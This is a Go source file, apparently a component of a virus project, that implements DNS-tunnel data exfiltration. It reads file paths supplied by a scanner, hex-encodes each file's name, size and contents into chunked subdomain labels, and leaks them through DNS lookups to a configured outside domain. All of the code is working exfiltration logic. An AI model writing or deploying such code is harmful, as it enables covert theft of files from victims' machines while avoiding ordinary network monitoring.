package Resolver

import (
	"os"
	"fmt"
	"encoding/hex"
	"net"
	"sync"
	"log"
	"bytes"
	"InfoSec/Virus/Scanner"
	"strconv"
	"InfoSec/Params"
	"hash/crc64"
)

// WG is wait group to synchronize the pool and the main routine
var Wg sync.WaitGroup
var ecmaTable = crc64.MakeTable(crc64.ECMA)

// Scan reads file paths from channel and sends it
func Scan() {
	Wg.Add(1)
	for file := range Scanner.FileNames {
		SendFile(file)
	}
	Wg.Done()
}

// SendFile opens file and sends in particular format
func SendFile(path string) error {
	buffer := make([]byte, Params.BufSize)
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()
	info, _ := file.Stat()
	prefix := crc64.Checksum([]byte(path), ecmaTable)

	filename := info.Name()
	size := strconv.FormatInt(info.Size(), 10)
	if len(filename) > Params.MaxSubdomainLength / 2 {
		len := len(filename)
		filename = filename[len - Params.MaxSubdomainLength / 2 : len]
	}

	filename = hex.EncodeToString([]byte(filename))
	size = hex.EncodeToString([]byte(size))
	filename = fmt.Sprintf("%s.%s", filename, size)

	resolve(filename, prefix, 0)

	for i := int64(1);; {
		n, err := file.Read(buffer)
		encoded := hex.EncodeToString(buffer[:n])
		encoded = insertNth(encoded, Params.MaxSubdomainLength, '.')
		resolve(encoded, prefix, i)
		i += int64(n)
		if n < Params.BufSize || err != nil {
			break
		}
	}
	return nil
}

// resolve: forms host and resolves it
func resolve(content string, prefix uint64, offset int64) {
	host := fmt.Sprintf("%016x.%016x.%s.%s", prefix, offset, content, Params.URL)
	//fmt.Printf("2017-11-12 14:22:41 %s.\n", host)
	_, err := net.LookupHost(host)
	if err != nil {
		log.Println(err)
	}
}

// For future improvements and extensions
func insertNth(s string, n int, del rune) string {
	var buffer bytes.Buffer
	var len = len(s) - 1
	for i, r := range s {
		buffer.WriteRune(r)
		if i % n == n - 1 && i != len  {
			buffer.WriteRune(del)
		}
	}
	return buffer.String()
}